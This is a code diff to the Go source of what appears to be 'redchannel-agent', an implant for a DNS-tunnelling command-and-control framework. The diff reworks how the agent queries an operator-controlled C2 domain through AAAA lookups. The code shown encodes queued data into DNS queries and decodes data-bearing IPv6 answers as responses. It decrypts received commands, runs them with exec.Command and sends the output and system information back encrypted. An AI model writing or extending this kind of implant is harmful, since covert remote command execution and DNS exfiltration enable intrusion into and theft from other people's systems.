@@ -15,8 +15,8 @@ import (
 	"os/user"
 	"sort"
 	"strings"
+	"time"
 
-	"github.com/miekg/dns"
 	"github.com/slackr/redchannel-agent/config"
 	"google.golang.org/protobuf/proto"
 )
@@ -49,8 +49,8 @@ const DATA_PAD_CHAR = "f"
 const AES_GCM_NONCE_LEN = 12
 const AES_BLOCK_LEN = 16
 
-const RECORD_HEADER_PREFIX = "ff00"
-const RECORD_DATA_PREFIX = "2001"
+const IP_HEADER_PREFIX = "ff00"
+const IP_DATA_PREFIX = "2001"
 
 const PROXY_DATA_SEPARATOR = ";"
 
@@ -107,17 +107,19 @@ func (a *Agent) CheckIn() {
 			log.Printf("no data from proxy c2\n")
 		}
 	}
-	// if we don't have a computed secret yet, we will send dummy data with our checkin
-	// this will be our first ping if the c2 doesn't know about us yet.
-	// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
-	// the operator may choose to delete the agent and allow first ping again
-	if a.crypto.secret == nil {
-		log.Printf("checking in with dummy data (no secret computed yet)\n")
-		a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
-		a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
-		return
-	}
+
 	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) {
+		// if we don't have a computed secret yet, we will send dummy data with our checkin
+		// this will be our first ping if the c2 doesn't know about us yet.
+		// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
+		// the operator may choose to delete the agent and allow first ping again
+		if a.crypto.secret == nil {
+			log.Printf("checking in with dummy data (no secret computed yet)\n")
+			a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
+			a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
+			return
+		}
+
 		log.Printf("checking in with encrypted data\n")
 		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
 	}
@@ -206,9 +208,9 @@ func (a *Agent) CleanupSendQ(cleanupCommand AgentCommand) {
 }
 
 // CleanupSendQ removes specified AgentCommand queue items
-func (a *Agent) IsCommandInSendQ(cleanupCommand AgentCommand) bool {
+func (a *Agent) IsCommandInSendQ(findCommand AgentCommand) bool {
 	for _, command := range a.sendq {
-		if command == cleanupCommand {
+		if command == findCommand {
 			return true
 		}
 	}
@@ -241,62 +243,39 @@ func (a *Agent) ProcessSendQ() {
 		antiCacheValue := a.crypto.RandomHexString(4)
 		query := antiCacheValue + "." + sendQItem + "." + a.config.C2Domain
 
-		// var err error
-
-		dnsMessage := new(dns.Msg)
-		dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
-		dnsMessage.RecursionDesired = true
-		dnsClient := new(dns.Client)
-		dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
-		// log.Printf("raw: %s %s %s", in, rtt, err)
-
-		var c2Response []string
-		if err != nil {
-			// fmt.Printf("Error getting the IPv6 address: %s\n", err)
-		} else if dnsResponse.Rcode != dns.RcodeSuccess {
-			// fmt.Printf("Error getting the IPv6 address: %s\n", dns.RcodeToString[in.Rcode])
-		} else {
-			for _, record := range dnsResponse.Answer {
-				switch recordType := record.(type) {
-				case *dns.AAAA:
-					c2Response = append(c2Response, recordType.AAAA.String())
+		resolver := &net.Resolver{
+			// cgo does not return IPv6 addresses for some reason
+			PreferGo: true,
+			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+				d := net.Dialer{
+					Timeout: time.Millisecond * time.Duration(10000),
 				}
+				return d.DialContext(ctx, network, a.config.Resolver)
+			},
+		}
+
+		hostIps, err := resolver.LookupHost(context.Background(), query)
+		// ips, err := net.LookupHost(query)
+		if err != nil {
+			log.Printf("error resolving %s: %s\n", query, hostIps)
+			return
+		}
+
+		var dataIps []string
+		for _, ip := range hostIps {
+			if strings.HasPrefix(ip, IP_HEADER_PREFIX) || strings.HasPrefix(ip, IP_DATA_PREFIX) {
+				dataIps = append(dataIps, ip)
 			}
 		}
 
-		// r := &net.Resolver{
-		// 	PreferGo: true,
-		// 	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-		// 		print(a.config.Resolver)
-		// 		d := net.Dialer{
-		// 			Timeout: time.Millisecond * time.Duration(10000),
-		// 		}
-		// 		// on Windows, custom resolvers do not work, it'll always use the OS resolver
-		// 		return d.DialContext(ctx, network, a.config.Resolver)
-		// 	},
-		// }
-		// ip, _ := r.LookupHost(context.Background(), query)
-		// log.Printf("ips: %s\n",ip[0])
-
-		if len(c2Response) > 0 {
+		if len(dataIps) > 0 {
 			// process response
-			log.Printf("c2 response for %q: %s\n", query, c2Response)
+			log.Printf("c2 response for %s: %s\n", query, dataIps)
 			delete(a.sendq, sendQItem)
-			a.ProcessResponse(c2Response)
+			a.ProcessResponse(dataIps)
 		} else {
-			log.Printf("empty c2 response for: %q\n", query)
+			log.Printf("no valid data ips in c2 response for: %s, %s\n", query, hostIps)
 		}
-
-		// response, err = net.LookupHost(query)
-		// if err != nil {
-		// 	log.Printf("error looking up %q (err: %q)\n", query, err)
-		// }
-		// if response != nil {
-		// 	// process response
-		// 	log.Printf("c2 response for %q: %s\n", query, response)
-		// 	delete(a.sendq, item)
-		// 	a.ProcessResponse(response)
-		// }
 
 		// only one SendQ item at a time if throttled
 		if a.config.ThrottleSendQ {
@@ -326,7 +305,7 @@ func (a *Agent) ProcessResponse(response []string) {
 	// look for the header because fucking go doesn't return the records in order
 	headerIndex := 0
 	for i := range response {
-		if strings.HasPrefix(response[i], RECORD_HEADER_PREFIX) == true {
+		if strings.HasPrefix(response[i], IP_HEADER_PREFIX) == true {
 			headerFound = true
 			headerIndex = i
 
@@ -436,7 +415,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 
 	data = data[:len(data)-padded_bytes_count]
 
-	log.Printf("processed recv: %d: %x\n", command, data)
+	log.Printf("processed recv for command: %s: %x\n", AgentCommand_name[int32(command)], data)
 	delete(a.recvq, command)
 
 	// keyx commands are not encrypted
@@ -458,7 +437,7 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 
 	decryptedData, err := a.crypto.DecryptAesCbc(data, a.crypto.secret)
 	if err != nil {
-		log.Printf("error decrypting data for command %q: %x (err: %q)\n", command, data, err)
+		log.Printf("error decrypting data for command %s: %x (err: %q)\n", AgentCommand_name[int32(command)], data, err)
 		return
 	}
 
@@ -481,16 +460,16 @@ func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_
 		a.SendEncrypted([]byte(sysinfoProto), AgentCommand_AGENT_SYSINFO)
 		break
 	case AgentCommand_AGENT_EXECUTE:
-		cmd := string(decryptedData)
-		args := strings.Fields(cmd)
+		executeCommand := string(decryptedData)
+		commandArguments := strings.Fields(executeCommand)
 		go func() {
-			out, err := exec.Command(args[0], args[1:]...).Output()
+			out, err := exec.Command(commandArguments[0], commandArguments[1:]...).Output()
 			if err != nil {
-				log.Printf("error executing: %s (err: %s)\n", cmd, err)
+				log.Printf("error executing: %s (err: %s)\n", executeCommand, err)
 				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_MESSAGE)
 				return
 			}
-			log.Printf("executed command: %s output: %s\n", cmd, out)
+			log.Printf("executed command: %s output: %s\n", executeCommand, out)
 			a.SendEncrypted(out, AgentCommand_AGENT_MESSAGE)
 		}()
 		break
